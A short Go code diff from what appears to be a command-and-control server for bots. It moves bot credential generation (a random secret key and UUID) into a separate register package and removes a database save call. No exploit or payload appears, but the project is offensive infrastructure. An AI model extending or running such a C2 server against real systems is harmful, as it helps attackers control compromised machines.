@@ -1,11 +1,9 @@
 package main
 
 import (
-	database "c2/server/db"
 	"c2/server/models"
+	"c2/server/register"
 	"context"
-	"crypto/rand"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -15,7 +13,6 @@ import (
 
 	"github.com/coder/websocket"
 	"github.com/coder/websocket/wsjson"
-	"github.com/google/uuid"
 )
 
 const (
@@ -157,29 +154,10 @@ func (c *c2) DisconnectBot(botID string) bool {
 }
 
 func GenerateBot(w http.ResponseWriter, r *http.Request) {
-	botcreds, err := GenerateBotCredentials()
+	botcreds, err := register.GenerateBotCredentials()
 	if err != nil {
 		log.Println(err)
 		return
 	}
 
-	database.SaveToDB(botcreds)
-
 }
-
-func GenerateBotCredentials() (models.BotCreds, error) {
-	buf := make([]byte, 32)
-	if _, err := io.ReadFull(rand.Reader, buf); err != nil {
-		return models.BotCreds{}, err
-	}
-	secretkey := hex.EncodeToString(buf)
-	id := uuid.NewString()
-
-	return models.BotCreds{
-		ID:        id,
-		SecretKey: secretkey,
-	}, nil
-
-}
-
-func CreateChallenge() string { return "" }
